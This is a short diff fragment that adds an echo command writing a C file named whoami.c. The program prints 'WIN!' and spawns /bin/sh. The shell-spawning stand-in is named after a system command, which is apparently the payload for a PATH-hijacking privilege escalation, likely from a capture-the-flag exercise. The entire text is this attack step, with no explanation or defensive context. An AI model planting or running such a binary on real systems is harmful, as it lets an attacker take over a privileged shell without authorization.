@@ -1,0 +1,11 @@
+echo "#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+
+int main()
+{
+    printf(\"WIN!\");
+    system(\"/bin/sh\");
+    exit(0);
+}" > whoami.c
